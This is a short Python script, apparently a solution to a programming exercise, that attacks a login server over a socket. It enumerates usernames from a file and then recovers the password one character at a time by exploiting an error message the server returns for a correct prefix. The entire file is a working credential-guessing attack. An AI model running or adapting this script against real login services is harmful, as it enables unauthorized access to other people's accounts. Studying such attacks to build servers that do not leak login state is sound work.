import string
import sys
import socket
import json

args = sys.argv
address = (args[1], int(args[2]))

logins = open('logins.txt', 'r')

client_socket = socket.socket()
client_socket.connect(address)

logon_msg = {"login": '', "password": ' '}

# Find login
for line in logins:

    line = line.strip('\n')
    logon_msg["login"] = line
    logon_msg_json = json.dumps(logon_msg, indent=4)
    logon_msg_bytes = logon_msg_json.encode()

    client_socket.send(logon_msg_bytes)

    response_json = client_socket.recv(1024).decode()
    response = json.loads(response_json)
    if response["result"] == "Wrong password!":
        break

# Find password
chars = list(string.ascii_lowercase + string.ascii_uppercase) + [str(d) for d in range(10)]
flag = True
pwd = ''

while flag:

    for char in chars:
        logon_msg["password"] = pwd + char
        logon_msg_json = json.dumps(logon_msg, indent=4)
        logon_msg_bytes = logon_msg_json.encode()

        client_socket.send(logon_msg_bytes)

        response_json = client_socket.recv(1024).decode()
        response = json.loads(response_json)

        if response["result"] == "Exception happened during login":
            pwd = logon_msg['password']
            break
        elif response["result"] == "Connection success!":
            print(logon_msg_json)
            flag = False
            break

logins.close()
client_socket.close()
